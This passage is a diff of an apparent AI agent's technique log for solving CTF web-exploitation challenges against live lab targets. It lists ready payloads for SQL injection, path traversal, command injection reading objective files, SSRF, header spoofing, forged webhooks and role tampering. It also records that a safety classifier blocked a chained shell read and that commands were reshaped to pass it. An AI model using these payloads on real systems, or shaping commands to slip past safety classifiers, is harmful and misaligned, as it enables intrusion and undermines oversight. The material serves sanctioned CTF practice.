`inspect`; secondary `callback` | `internal` | `status` | `result` | `audit` | `account` | `staff-<hex8>`; fixed","+  `inspect`. Secondary `callback` | `internal` | `status` | `result` | `audit` | `account` | `staff-<hex8>`. Fixed","   paths `/preferences` (D09), `/api/inventory` (D14), `/api/recovery` (D17), `/api/state-format` (D20). Re-dealt","-  within a day (D12, D13, D15-D18, D20 process -> action). Rule: pick routes by clue KEY role (or a guide JSON's","-  `*_route` / `transport` value), never by the word in the value.","-- **Clue key set**: concept key (D06-D10, D14, D16-D20) | two body-VALUE keys (D19 `event_type: case.promoted`,","-  `owner_scope: executive`: echo them as JSON fields, not routes) | only feature+secondary (D12, D13, D15) | only","-  feature (D05, D11). D18 swapped `current_role` -> `current_user`, dropped `framework`. Rule: no concept key ->","-  prompt + bare GET of each route; a key shared by two classes (`protected_reference`: D14 with `inventory_route`,","-  D18 with `note`) -> route on the companion key, or race both handlers.","+  within a day (D22 dispatch -> process). Rule: pick routes by the clue KEY's role (or a guide's `*_route` /","+  `transport` value), never by the word in the value.","+- **Clue key set**: one concept key (D06-D10, D14, D16-D20) | VALUE keys to echo, not routes (D19 `event_type` +","+  `owner_scope`; D22 `stream_reference` int, re-dealt 13777 -> 14733; D23 `deployment: trusted_reverse_proxy`) | only","+  feature+secondary (D12, D13, D15, D21) | only feature (D05, D11). Rule: no concept key -> prompt + bare GET of each","+  route. A key shared by two classes (`protected_reference`: D14 / D18) -> route on the companion key, or race both."," - **Framework costume** (never changes the exploit): Django, Laravel, Node, FastAPI, Spring Boot, Sinatra, NestJS,","-  Jakarta Servlet, ASP.NET Core, Gin (D16), Symfony (D17), GraphQL.js (D18), Starlette (D19), Quarkus (D20). Rule:","-  ignore it -- except that a Go server drops a raw `;` from the query string (percent-encode).","+  Jakarta Servlet, ASP.NET Core, Gin, Symfony, GraphQL.js, Starlette, Quarkus, Rails (D21), Koa (D22), Micronaut","+  (D23); PHP+Apache for the D04 app. Rule: ignore it, except that Go drops a raw `;` from a query (percent-encode)."," - **Request body encoding (D12, D13, D19, D20)**: POST routes accept form AND JSON but only JSON binds; D19 answers","-  a JSON array `[]` with a bare 500. D20 nests a second encoding: `{\"<request_field>\": base64url(JSON)}` (no `=`","-  padding), named by the guide's `encoding: \"base64url of UTF-8 JSON\"`. Rule: JSON object first; when a guide names","-  an `encoding`, build the inner blob with exactly that codec (base64url | base64 | hex | raw).","-- **Privilege value spelling**: D13 bound `role: admin` (with siblings); D20 accepted ONLY `role: \"administrator\"`","-  (`admin`, `ADMIN`, `staff`, `admin:true`, `is_admin:true`, `roles:[\"admin\"]` -> `role_not_permitted`). Rule: one","-  request per spelling, ladder `administrator, admin, superuser, root, owner, staff, manager`, other sample keys","-  unchanged; `role_not_permitted` = right field, wrong value -- keep laddering.","+  `[]` with a bare 500. D20 nests `{\"<request_field>\": base64url(JSON)}` (no `=`), named by the guide's `encoding`.","+  Rule: JSON object first; when a guide names an `encoding`, build the inner blob with exactly that codec.","+- **Privilege value spelling**: D13 bound `role: admin`; D20 accepted ONLY `role: \"administrator\"` (`admin`/`staff`/","+  flags -> `role_not_permitted`). Rule: ladder `administrator, admin, superuser, root, owner, staff, manager`.","+- **Trusted client identity (D23)**: `loopback_only` names the rule and `evaluated_client` echoes what the app","+  believed (`10.x` = the proxy hop). `X-Forwarded-For: 127.0.0.1` flipped it in single, TT and Mastery. Rule: one","+  header at a time, ladder `X-Forwarded-For, X-Real-IP, Forwarded: for=, X-Client-IP, True-Client-IP, Client-IP,","+  X-Original-Forwarded-For, X-Cluster-Client-IP` x `127.0.0.1, ::1, localhost`. Any header the error names goes","+  first; private ranges only when it says internal/private. Watch `evaluated_client` change.","+- **Transport upgrade (D22)**: feature GET -> 426 `websocket_upgrade_required`. The handshake WITHOUT `Origin` -> 403;","+  with an Origin (own host or foreign) -> 101. The stream is selected by `?stream=<stream_reference>` and the FIRST","+  server text frame carries `{\"ok\":true,\"effect\":\"unauthorized_event_stream\",\"evidence\":\"proof_..\"}`. Same shape in","+  TT and Mastery. Rule: raw stdlib TLS socket (no websocket lib in the venv), `Origin: <target origin>`, query","+  `stream=<ref>`; fall back to a `{\"stream\":ref}` / `{\"subscribe\":ref}` text frame.","+- **One-shot state (D21)**: secondary (`audit-<hex6>`) = 403 `credit_not_overspent` + `credits: N`; feature POST spends","+  the single credit (`credits: 0`, then 409 `credit_unavailable` forever, no reset route). Rule: GET-only recon, then","+  ONE barrier-synced burst of ~24 concurrent POSTs `{}` to `feature_route` before anything else POSTs, then GET secondary."," - **Earlier classes (one line each)**: D01 robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/` -> `.json.bak`","-  (depth-2 crawl). D02 foreign ids in `/api/history`. D03 `('%..%')` wrapper -> tautology ladder over `'` `')` `'))`","-  `\"` + `--`/`#`. D04 every param holding `.`/`/` x `../`*10 + prompt path. D05 GET then POST every clue route. D07","-  board noun `messages` | `postcards` from openapi. D09 outside mailbox option `review-NNNN@outside.example.invalid`.","-  D10 preview URL from the upload response's `path`. D11 SSTI param `template`, `{{..}}` evaluated (`${..}` literal","-  under \"Spring Boot\"), var `objective`: probe every delimiter family per param. D12 `x' OR '1'='1' -- ` | `zz' OR","-  1=1 --` as JSON in every field, re-GET secondary after EACH plant. D13 one JSON body `display_name` + `role`,","-  `is_admin`, `isAdmin`, `admin`, `roles`, `access_level`, `permissions`. D14 inventory `fields [title, note]` x","-  `actions [view, export]`, only a SINGLE pair bypasses. D15 `?url=http://127.0.0.1:8080<secondary>` (80/5000/8000/","-  3000 = `fetch_failed`).","-- **Command injection (D16)**: `input_parameter: path`, `example_path: /app/static` constant; base `ls -ld <path>`.","-  Rule: param from `input_parameter` (else `<x>_required`), value = example + `%3B` + `cat /run/huntress/objective.txt`.","-- **Password reset (D17)**: guide `{request_route, redeem_route, account_parameter, token_parameter, accounts[{id,","-  label,self_service}]}` same keys in single/TT. Rule: token for the `self_service:true` id, redeem with each other id.","-- **GraphQL resolver (D18)**: schema identical in all modes (`caseIndex`, `case(id:ID!){id,title,note}`); protected","-  id is a STRING. Rule: introspect, call every arg-taking Query field with it; POST JSON first, then GET `?query=`.","-- **Forged webhook (D19)**: feature route 405 `post_required`; every narrow JSON body (event + scope, any single","-  alias, `signature`/`verified`/`trusted`/`source:\"trusted\"`/`sender:\"system\"`, `X-*-Signature` headers, nested","-  `event{}`/`data{}`, form) -> `webhook_rejected`. One kitchen-sink JSON landed in single, TT and Mastery: the clue","-  values under every alias (`event_type`, `type`, `event`; `owner_scope`, `scope`, `owner`) + `role`/`current_role`","-  `admin` + `source`/`sender` `\"provider\"` + `verified`/`signed`/`trusted` true (which key mattered was NOT bisected).","-  Rule: send the alias-union body first; bisect only if it fails.","-- **Unsigned serialized state (D20)**: `state_format_route` -> `{transport: \"POST <feature>\", content_type:","-  application/json, request_field: state, encoding: \"base64url of UTF-8 JSON\", sample_state:{user, role},","-  sample_encoded}`; same shape in single/TT/Mastery, only the feature word moved. Rule: route from `transport`,","-  field from `request_field`, decode `sample_encoded`/copy `sample_state`, swap every `*role*` key down the ladder.","-- **Proof carrier**: HTML text / `<pre>`, JSON `support_note` | `note` | `evidence` | `rows[]` | `stdout`, GraphQL","-  `data.<alias>.note`, a receipt on a board page. Rule: regex `proof_[0-9a-f]{32}` over every body -- never key on","-  field names or on `effect`.","+  (depth 2). D02 foreign ids in `/api/history`. D03 `('%..%')` wrapper -> tautology ladder over `'` `')` `'))` `\"` +","+  `--`/`#`. D04 every param holding `.`/`/` x `../`*10 + objective path. D05 GET then POST every clue route. D07 board","+  noun `messages` | `postcards`. D09 outside mailbox `review-NNNN@outside.example.invalid`. D10 preview URL from the","+  upload response's `path`. D11 SSTI param `template`, `{{..}}` evaluated, var `objective`. D12 `x' OR '1'='1' -- ` as","+  JSON in every field, re-GET secondary after EACH plant. D13 `display_name` + privilege keys. D14 single field x","+  action pair. D15 `?url=http://127.0.0.1:8080<secondary>`. D16 `input_parameter` + `example_path%3Bcat","+  /run/huntress/objective.txt`. D17 token for the `self_service:true` id redeemed with another id. D18 introspect,","+  protected id as a STRING. D19 alias-union JSON body. D20 guide `transport`/`request_field`/`encoding`, role ladder.","+- **Proof carrier**: HTML text / `<pre>` / `<article>`, JSON `support_note` | `note` | `evidence` | `rows[]` |","+  `stdout`, GraphQL `data.<alias>.note`, a bot receipt, a WebSocket text frame. Rule: regex `proof_[0-9a-f]{32}` over","+  every body/frame; never key on field names or on `effect`."," "," ## Recognition cues -> first move","-- `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without `--max-time`;","+- `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (the hook blocks curl without `--max-time`, and","   Cloudflare 403'd urllib's default UA), then `/robots.txt`, `/api/clues`, `/openapi.json`, `/sitemap.xml`.","-- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece. No concept key -> the","-  prompt's verb names the bug. Any `*_guide_route` / `inventory_route` is a JSON map of the next requests: read it.","-- `Disallow:` -> D01 crawl. \"Signed in as\" + `/<things>/<id>` -> D02 IDOR. Search / \"database\" -> D03 tautology.","-  `?doc=` + \"stay inside\" -> D04 traversal. \"staff-only door, just a sign\" -> D05 GET it.","-- \"repeats everything\", `callback_nonce` -> D06 reflect + same-origin fetch-metadata callback. \"guestbook\",","-  `moderator_data_route` -> D07 stored script for the bot; poll. \"plant your session\", `session_hint` -> D08 `?sid=`.","-- \"obeys whoever asks nicely -- even strangers\", hidden `csrf_token` -> D09 cross-site form submit. \"upload form has","-  standards. Low ones\", `upload_shape` -> D10 `.html` with `{{objective}}`. \"evaluates everything\", empty","-  \"Rendered message\" `<pre>` -> D11 `?template={{objective}}`. \"plant ... come back later\", `post_required` +","-  `{\"rows\":[]}` -> D12 JSON plant then GET secondary. \"binds whatever you hand it\", `administrator_required` -> D13","-  privilege keys in one JSON body. `inventory_route` + `protected_reference` -> D14 field x action grid.","-  `absolute_url_required` + `internal_only` -> D15 `?url=http://127.0.0.1:8080<secondary>`.","-- \"a little too close to a real shell\", `input_parameter` + `example_path`, 400 `path_required` -> D16:","-  `curl -G \"$U<feature>\" --data-urlencode \"path=/app/static;cat /run/huntress/objective.txt\"` -> `stdout` line 2.","-- \"Forgot your password\", `recovery_guide_route` -> D17: guide -> token for the `self_service` id -> redeem it with","-  the other `account_id`. \"Discover the schema\", `protected_reference` + `note`, GET 404 `not_found` -> D18 POST","-  JSON introspection, then `{case(id:\"<protected>\"){id title note}}`.","-- \"believes every event it's told about\", \"forged news\", clues `event_type` + `owner_scope`, feature 405","-  `post_required`, POST -> `webhook_rejected` -> D19: ONE JSON body with the clue values under every alias","-  (`event_type`/`type`/`event`, `owner_scope`/`scope`/`owner`) + `role`/`current_role: admin` + `source`/`sender:","-  provider` + `verified`/`signed`/`trusted: true` -> `forged_event_consumed` + `evidence`.","-- \"Your session is just a blob\", \"reshape the bytes, sign nothing\", clue `state_format_route`, feature 400","-  `state_required` -> D20: GET the format guide, POST JSON `{\"state\": b64url('{\"user\":\"analyst\",\"role\":","-  \"administrator\"}')}` to the guide's `transport` route -> `serialized_role_trusted` (`admin` = `role_not_permitted`).","+- Read /api/clues FIRST and GET each route bare: the JSON error names the missing piece. No concept key -> the","+  prompt's verb names the bug. Any `*_guide_route` / `inventory_route` is a JSON map of the next requests.","+- **Before ANY POST: is the state one-shot?** \"one credit\", \"twice\", \"race\", \"at the same time\", a secondary that","+  reports `credits`/`balance`/`remaining` -> GET only, then burst (D21). A sequential ladder POST burns the target.","+- `Disallow:` -> D01 crawl. \"Signed in as\" + `/<things>/<id>` -> D02 IDOR. Search / \"database\" -> D03. `?doc=` +","+  \"stay inside\" / \"runbooks ... proper directory\" -> D04 traversal. \"staff-only door, just a sign\" -> D05 GET it.","+- \"repeats everything\", `callback_nonce` -> D06. \"guestbook\", `moderator_data_route` -> D07 bot; poll. `session_hint`","+  -> D08 `?sid=`. \"even strangers\", hidden `csrf_token` -> D09 cross-site submit. `upload_shape` -> D10 `.html` with","+  `{{objective}}`. \"evaluates everything\" -> D11 `?template={{objective}}`. \"plant ... come back later\" -> D12.","+  \"binds whatever you hand it\" -> D13. `inventory_route` -> D14. `absolute_url_required` + `internal_only` -> D15.","+  `input_parameter` + `example_path` -> D16. `recovery_guide_route` -> D17. `protected_reference` + `note`, GET 404","+  -> D18 GraphQL. `event_type` + `owner_scope`, `webhook_rejected` -> D19 alias-union body. `state_format_route` ->","+  D20 b64url state with `role: administrator`.","+- \"One credit, two purchases ... race it\", clues only feature+secondary (`/execute-..`, `/audit-..`), secondary 403","+  `credit_not_overspent` -> D21: N concurrent POST `{}` released on a barrier (threads or HTTP/2 multiplexing), then","+  GET secondary. UNSOLVED so far: the only target was already at `credits: 0`.","+- \"upgraded to websockets ... event stream that was never meant for you\", clue `stream_reference`, 426","+  `websocket_upgrade_required` -> D22: WS handshake to `feature_route?stream=<ref>` WITH an `Origin` header; read","+  frames for the proof.","+- \"believes whatever the proxy whispers ... right header ... protected path\", clue `deployment:","+  trusted_reverse_proxy`, 403 `loopback_only` + `evaluated_client` -> D23: `curl -H 'X-Forwarded-For: 127.0.0.1'","+  <feature>` -> `proxy_trust_admin_bypass` + `evidence`."," - Proof regex hit = landed; an `effect` alone is NOT (D12 empty rows; D16 baseline already says completed)."," "," ## Day by day","-- **D01-D15 (cal. 19-24)**: D01 robots -> index -> `.json.bak`. D02 `/api/history` foreign id. D03 `?q=zz') OR","-  1=1 --`. D04 `?doc=../`*6+prompt path. D05 GET the feature route. D06 reflect `fetch(cb?nonce)`, GET cb with","-  same-origin fetch-metadata. D07 stored script for the moderator bot, poll the receipt. D08 `?sid=<hint>` ->","-  `arena_session`. D09 cross-site fetch-metadata submit. D10 upload `.html` with `{{objective}}`. D11","-  `?template={{objective}}`. D12 JSON plant, GET secondary. D13 JSON privilege keys. D14 single field x action.","-  D15 `?url=http://127.0.0.1:8080<secondary>`. Singles 47-116 s (D08 Mastery ~15 min: every solver on every target).","-- **D16-D18 (cal. 25)**: D16 Shell Company (Gin, `?path=/app/static%3Bcat /run/huntress/objective.txt`; raw `;`","-  dropped by Go; `ls -ld` baseline already says `worker_command_completed`) ~40 s. D17 Reset Expectations (Symfony,","-  guide `/api/recovery` -> own 12-hex token redeemed with the executive `account_id` -> `synthetic_account_recovery`)","-  ~39 s. D18 Resolver Revolt (GraphQL.js; GET 404 `not_found`, POST JSON introspection, `case(id:\"<protected>\")","-  {note}`) ~36 s. All three TT `solver_incomplete` (plugins 0-2 s late), hand-solved in 31-53 s; D16 Mastery 3/4","-  (plugin still `.tmp`). A live turn chaining `ls -la; cat /run/huntress/*` was stopped by a safety classifier --","-  keep an injection to one plain read of the objective file.","-- **D19 Trust the Webhook (cal. 26)** -- unauthenticated webhook trusts forged events (OWASP API10 / A08). Clues","-  `{framework: \"Starlette\", feature_route: /dispatch-<hex6>, current_role, event_type: \"case.promoted\", owner_scope:","-  \"executive\"}`, no secondary. GET feature -> 405 `post_required`; ~30 narrow POSTs (JSON, form, nested, signature","-  headers, `verified`/`trusted`/`source:trusted`/`sender:system`, `role:executive`) -> `{\"error\":\"webhook_rejected\"}`;","-  `[]` -> 500. The answer-first worker's alias-union body (see Recognition cues) -> `{\"ok\":true,\"effect\":","-  \"forged_event_consumed\",\"evidence\":\"proof_...\"}`. Single CORRECT 13:02:09 (~95 s from start, target ready after","-  ~13 s); the three duel/local workers lost ~60 s bisecting narrow bodies. TT 10.2 s, Mastery 4/4 13.3 s, first try.","-- **D20 Serialized Offender (cal. 26)** -- unsigned client-side state blob (A08 / data-tamper deserialization).","-  Clues `{framework: \"Quarkus\", feature_route: /process-<hex6> | /action-<hex6>, state_format_route:","-  \"/api/state-format\", current_role}`. Bare feature -> 400 `{\"error\":\"state_required\",\"state_format_route\":..}`.","-  Guide: `{transport: \"POST /process-..\", content_type: application/json, request_field: state, encoding: \"base64url","-  of UTF-8 JSON\", sample_state: {user: analyst, role: analyst}, sample_encoded: \"eyJ1c2Vy...\"}`. `printf '%s' \"$j\"","-  | basenc --base64url -w0 | tr -d =`; role `admin`/`ADMIN`/`staff`/flags -> `role_not_permitted`; `\"role\":","-  \"administrator\"` (any `user`) -> `serialized_role_trusted` + `evidence`. No signature anywhere. Target `preparing`","-  ~50 s; CORRECT 13:02:12 (~50 s after ready). TT 15.1 s, Mastery 4/4 15.6 s, first try.","+- **D01-D15 (cal. 19-24)**: D01 robots -> index -> `.json.bak`. D02 `/api/history` foreign id. D03 `?q=zz') OR 1=1","+  --`. D04 `?doc=../`*6+path. D05 GET the feature route. D06 reflect `fetch(cb?nonce)`, GET cb same-origin. D07 stored","+  script for the bot. D08 `?sid=<hint>`. D09 cross-site submit. D10 `.html` upload. D11 `?template={{objective}}`.","+  D12 JSON plant, GET secondary. D13 JSON privilege keys. D14 single field x action. D15 `?url=http://127.0.0.1:8080","+  <secondary>`. Singles 47-116 s (D08 Mastery ~15 min: every solver on every target).","+- **D16-D20 (cal. 25-26)**: D16 Shell Company (Gin, `%3B`-encoded `cat`) ~40 s. D17 Reset Expectations (own token","+  redeemed with the executive id) ~39 s. D18 Resolver Revolt (POST introspection) ~36 s. D16-D18 TT all","+  `solver_incomplete` (plugins late). D19 Trust the Webhook: ~30 narrow bodies -> `webhook_rejected`, one alias-union","+  body -> `forged_event_consumed`, ~95 s; TT/Mastery first try. D20 Serialized Offender: guide -> b64url state,","+  `administrator` only, ~50 s after ready; TT 15 s, Mastery 4/4. A live turn chaining `ls -la; cat /run/huntress/*`","+  was stopped by a safety classifier: keep an injection to one plain read of the objective file.","+- **D21 Double Spent (cal. 27)**: race condition / double spend (business logic, A04). Clues `{framework: Rails,","+  feature_route: /execute-<hex6>, secondary_route: /audit-<hex6>, current_role}`. Secondary 403 `{\"error\":","+  \"credit_not_overspent\",\"credits\":0}`. Feature POST 409 `{\"ok\":false,\"credits\":0,\"effect\":\"credit_unavailable\"}`","+  under sequential, 8x curl, 10x HTTP/2 and a 24x barrier burst. **NOT SOLVED.** The credit was already 0 at the","+  workers' first GET and never came back (~5 min). The likely cause is the harness's race_bisect / prior-solver dry","+  run, which ran 16 s on the fresh target and sent default-ladder POSTs to `feature_route`. TT/Mastery were not","+  started. A plugin draft (GET gate + 24-POST barrier burst) is in `solver/`; HELP.md is in single_solve/. Success","+  `effect` spelling still unknown.","+- **D22 Socket to Me (cal. 27)**: WebSocket event stream without per-subscriber authz (CSWSH-flavoured). Clues","+  `{framework: Koa, feature_route: /dispatch-<hex6>, current_role, stream_reference: 13777}`. GET -> 426. Handshake +","+  `Origin` + `?stream=<ref>` -> first frame `unauthorized_event_stream` + `evidence`. Stdlib client: `socket` +","+  `ssl` + `Sec-WebSocket-Key` handshake, read until the proof regex hits. Single CORRECT ~71 s from start. **TT","+  `solver_incomplete`**: the handler landed 20 s after TT solve began. The live worker wrote a raw WS client, CORRECT","+  ~40 s after ready. Mastery 4/5 in 18.5 s; proof-4 was a D04 `notes.php?doc=` target, solved by hand.","+- **D23 Forwarded Misgivings (cal. 27)**: app trusts a client-supplied proxy header (`X-Forwarded-For` spoofing).","+  Clues `{framework: Micronaut, feature_route: /action-<hex6>, current_role, deployment: \"trusted_reverse_proxy\"}`.","+  GET feature -> 403 `{\"error\":\"loopback_only\",\"evaluated_client\":\"10.x\"}`. Same GET with `X-Forwarded-For:","+  127.0.0.1` -> `{\"ok\":true,\"effect\":\"proxy_trust_admin_bypass\",\"evaluated_client\":\"127.0.0.1\",\"evidence\":..}`.","+  Re-runnable. Single CORRECT ~64 s from start (handler promoted before TT). TT 10.5 s (solve 2 s), first try.","+  Mastery 4/5 in 20 s; proof-4 was a D04 `handbook.php?doc=../`*10`run/huntress/objective.txt` target (proof in","+  `<article>`), solved by hand ~80 s after start."," "," ## GM answer conventions learned"," - Answer = bare `proof_<32 lowercase hex>` (the CORRECT body's `flag` is a different value; never submit it). `trim`.","   Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`","-  (D16 Mastery: 3 accepted, `remaining: 1`, then proof-4 alone -> CORRECT).","+  (cal. 27: both Mastery runs submitted 4, `remaining: 1`, then proof-4 alone -> CORRECT)."," - `effect` spellings confirmed: `framework_authorization_bypassed` (D05), `isolated_browser_callback` (D06),","   `fixed_session_privilege_transfer` (D08), `delayed_query_revealed_private_row` (D12), `bound_privileged_property`","   (D13), `api_field_action_authorization_bypassed` (D14), `internal_service_reached` (D15),","   `worker_command_completed` (D16, also on the harmless baseline), `synthetic_account_recovery` (D17),","-  `forged_event_consumed` (D19), `serialized_role_trusted` (D20); D18 none (plain GraphQL `data`). D09","-  `changed_across_sites:true`; D10, D11 rendered HTML; D07 a moderator receipt.","+  `forged_event_consumed` (D19), `serialized_role_trusted` (D20), `unauthorized_event_stream` (D22),","+  `proxy_trust_admin_bypass` (D23). Failure spelling `credit_unavailable` (D21). D18: none (plain GraphQL `data`)."," - `already_solved` after CORRECT is harmless; a 503 `temporarily_unavailable` on submit may still have landed.","-- Cal. 26 guidance text: TT/Mastery are \"regular scored challenges by default\"; `run_for_time:true` on start/retry","-  asks for a timed Hall-of-Fame attempt (`last_timed.json`: `no_clock:true`, `hall_of_fame_eligible:false`). The","-  transport line varies per contract (proxy `http://10.0.0.219/huntress-ctf-proxy` vs direct + bearer): `hctf` owns it.","+- TT/Mastery are \"regular scored challenges by default\"; `run_for_time:true` asks for a timed Hall-of-Fame attempt","+  (`last_timed.json`: `no_clock:true`). The transport line varies per contract; `hctf` owns it."," "," ## Pitfalls that cost time","-- Shipping a new class without its handler: TT `solver_incomplete` on D09-D10, D12-D13, D15-D18. Write","-  `lib/web/handlers/dayNN_*.py` (KEY_MAP on a concept KEY + HANDLERS) BEFORE the single submit (D11, D19, D20 did).","-- Bisecting a generic rejection one field at a time (D19: ~30 bodies, all `webhook_rejected`, ~60 s lost). A sink","-  that rejects without naming a field gets ONE alias-union JSON body first (every clue value under every alias +","-  role/source/trust flags); bisect afterwards only for the record.","-- Stopping at `role: admin`: D20 wanted `administrator`; `role_not_permitted` means the field is right -- ladder it.","-- Treating `effect` as success: D12 prints its effect with `rows: []`; D16 prints `worker_command_completed` for","-  the plain `ls`. Success = proof regex.","-- Raw `;` in a Go (Gin) query string is dropped -> `--data-urlencode` / `%3B`. GraphQL routes 404 on GET -> POST.","-- Form bodies on JSON APIs (D12 ignored form fields but said `saved:true`); JSON arrays 500 (D19). JSON object first.","-- Trusting the echo (D13 echoes only `display_name`) or the stated policy (\"txt only\", \"self-service only\" on","-  REQUEST but not REDEEM). SSRF `fetch_failed` = wrong port (D15: 8080), not \"blocked\". D14 lists/`*` forbidden --","-  only single field x action pairs. A 500 on `{{unknown}}` (D11) = undefined variable, not \"not injectable\".","-- Choosing routes by the WORD in a clue value (re-dealt every attempt) or by prompt keywords in Mastery. One-level","-  crawls (D01). Solvers importing each other's `fallback()`. Hammering one target with every probe in parallel.","-- Polling a bot-driven receipt for a fixed 12 s: the D07 moderator sometimes comes later.","+- **Burning a one-shot target (D21, unsolved).** A single sequential POST to the sink spends the only credit. Dry","+  runs, race_bisect, default ladders and earlier-day handlers that POST to `feature_route` must NOT run before the","+  race handler. Recon on a credit/balance kit is GET-only; the burst is the first POST.","+- **Earlier-day solvers keyed on the prompt** miss Mastery targets (D04 twice on cal. 27). Today's prompt describes","+  only today's bug, so hard-code each class's known defaults (`/run/huntress/objective.txt`).","+- Shipping a new class without its handler: TT `solver_incomplete` on D09-D10, D12-D13, D15-D18, D22. Write","+  `lib/web/handlers/dayNN_*.py` (KEY_MAP on a concept KEY + HANDLERS) BEFORE the single submit (D11, D19, D20, D23","+  did). A 20 s delay is enough to lose the TT.","+- Missing `Origin` on a WebSocket handshake = 403 (D22): send one. No websocket package in the venv; use stdlib.","+- Bisecting a generic rejection one field at a time (D19 ~60 s lost): send ONE alias-union body first.","+- Stopping at `role: admin` (D20 wanted `administrator`): `role_not_permitted` = right field, keep laddering.","+- Treating `effect` as success (D12 empty rows; D16 baseline). Success = proof regex.","+- Raw `;` in a Go query string is dropped -> `%3B`. GraphQL 404 on GET -> POST. Form bodies on JSON APIs are ignored","+  (D12); JSON arrays 500 (D19). JSON object first.","+- Trusting the echo (D13) or the stated policy (\"txt only\", \"self-service only\"). SSRF `fetch_failed` = wrong port","+  (D15: 8080). D14 lists/`*` forbidden. A 500 on `{{unknown}}` (D11) = undefined variable.","+- Choosing routes by the WORD in a clue value or by prompt keywords in Mastery. One-level crawls (D01). Solvers","+  importing each other's `fallback()`. Hammering one target with every probe in parallel.","+- Polling a bot receipt for a fixed 12 s (the D07 moderator sometimes comes later)."," - Live cases can't be replayed after CORRECT (410). Save target responses during the solve; never hard-code proofs."," - `curl` without `--max-time` is blocked by the hook (and `sleep` by no_block.py); urllib's default UA can draw a","   Cloudflare 403."," "," ## reviewer cross-check (measured on a parallel agent; folded into the drivers)"," - **Blind SQLi oracle trap (D03).** `q` sits in an EVEN number of `col LIKE '%q%'` clauses, so `' OR '1'='1` and","-  `' OR '1'='2` BOTH return all rows. Oracle = quote balance: `nope' OR (<cond>) OR '1'='2` reduces WHERE to","-  `<cond>`; calibrate on `1=1`/`1=2`. SQLite; `summary LIKE char(112,114,111,111,102,37)` spells `'proof%'`.","-- **LFI.** The `?doc=` viewer silently returns the NORMAL page for depth 1-2; use >= 3 `../` into the prompt path.","+  `' OR '1'='2` BOTH return all rows. Oracle = quote balance: `nope' OR (<cond>) OR '1'='2`; calibrate on `1=1`/`1=2`.","+- **LFI.** The `?doc=` viewer silently returns the NORMAL page for depth 1-2; use >= 3 `../` into the objective path."," - **`control_unavailable` is TRANSIENT** (a 26.7 s hang on `op=start`; resend succeeded). Back off and re-send."]}],"originalFile":"# web — technique log (lane-days D01-D20 released; updated after every day)\n\nHow the lane has looked so far (observations, not guarantees):\n- **Late release, catch-up pace.** No web on calendar days 1-18. Cal. 19 released D01-D03, 20 D04-D05, 21 D06-D08,\n  22 D09-D10, 23 D11-D13, 24 D14-D15, 25 D16-D18, 26 D19-D20 (GM ids `web-exploitation-day-NN-<slug>`; the slug is\n  usually the title but not always: D07 \"Stored for Later\" = `...-day-07-stored-xss`; folder\n  `challenges/<cal-day>/web-<title>`, so lane-day != folder day). D21-D31 = 11 left for cal. 27-31 (~2-3 per day).\n  Each lane-day = ONE classic bug, named by a title pun: D01 backup exposure \"Back Up a Minute\", D02 IDOR\n  \"Permission to Slip\", D03 SQLi \"Query Me This\", D04 path traversal \"Stay in Your Directory\", D05 missing\n  function-level authz \"Administratively Speaking\", D06 reflected XSS \"Reflect Upon This\", D07 stored XSS \"Stored for\n  Later\", D08 session fixation \"Session Impression\", D09 CSRF \"Forged With Care\", D10 unrestricted upload \"Uploading\n  Expectations\", D11 SSTI \"Template Temper\", D12 second-order SQLi \"Ask Again Later\", D13 mass assignment \"Posted Too\n  Much\", D14 per-field/action API authz \"The API Has Opinions\", D15 SSRF \"Fetch Quest\", D16 OS command injection\n  \"Shell Company\", D17 reset token not bound to the account \"Reset Expectations\", D18 GraphQL resolver without\n  field-level authz \"Resolver Revolt\", D19 unauthenticated webhook trusting forged events \"Trust the Webhook\", D20\n  unsigned client-side serialized state \"Serialized Offender\". Arc: info-disclosure -> access control -> injection ->\n  file read -> XSS x2 -> session -> CSRF -> upload -> SSTI -> second-order SQLi -> OWASP API run (mass assignment,\n  BFLA/BOPLA, SSRF) -> cmd injection -> auth flow (reset) -> GraphQL -> **integrity failures (OWASP A08: unsigned\n  webhook, unsigned state blob)**. Many days are \"one level deeper\" sequels (D10->D11, D03->D12, D05->D13->D14,\n  D14->D18); D19+D20 are a pair (\"forged news\", \"sign nothing\") -> signed-but-weak tokens (JWT, signed cookies) are\n  the natural next step.\n- **No artifact: a live target.** `start` returns `result: preparing` until ready, then `targets: [{\"id\": \"Target N\",\n  \"url\": \"https://<48hex>.2026.huntress.ctf.games/\"}]`. Reachable directly from the host, behind Cloudflare. After\n  CORRECT every path returns `410 {\"state\":\"completed\"}`; an untimed target stops after 30 min idle.\n- **Contract is fixed:** `proof-N` \"Recover the proof from Target N.\", artifact `Target N`, `exact_text`, `trim`.\n  Answer = token `proof_<32 lowercase hex>` printed by the app. The prompt (one or two sentences) names the bug.\n- **Since D05 every app is the same kit** (\"A small, complete training app with one deliberately isolated security\n  boundary\"; framework banner = costume). `GET /api/clues` names the routes (`feature_route: /<word>-<hex6>`, often\n  `secondary_route`), `current_role: analyst` (D18: `current_user`, no `framework` key), plus usually ONE concept key\n  (`session_hint`, `callback_nonce`, `moderator_data_route`+`receipt_route_template`, `preferences_route`,\n  `render_route`+`preview_guide`+`upload_policy`+`upload_shape`, D14 `inventory_route`+`protected_reference`, D16\n  `input_parameter`+`example_path`, D17 `recovery_guide_route`, D18 `protected_reference`+`note`, D19 `event_type`+\n  `owner_scope` (BODY VALUES, not routes), D20 `state_format_route`). D11-D13, D15 had NO concept key: prompt +\n  bare-route errors are the routing signal. Bare routes answer JSON errors naming the missing piece\n  (`session_id_required`, `authenticated_login_required`, `browser_callback_required`, `post_required` (405),\n  `administrator_required` (403), `internal_only` (403), `absolute_url_required` (400), `fetch_failed`,\n  `id_fields_action_required`, `field_action_forbidden`, `path_required` (+`example_path`), `account_id_required`,\n  `self_service_only`, `token_and_account_id_required`, `webhook_rejected`, `state_required` (+`state_format_route`),\n  `role_not_permitted`; a GraphQL route answers GET with 404 `not_found`). Success = proof regex in `evidence`,\n  `rows[]`, `stdout`, a GraphQL `data` field, or a rendered page.\n- **The runtime config is readable.** Any file-read primitive (D16 `cat /run/huntress/*`) also shows\n  `/run/huntress/config.json`: `{\"schema\":\"huntress.web_exploitation.runtime_config.v1\",\"profile_id\":\"framework_go_gin_\n  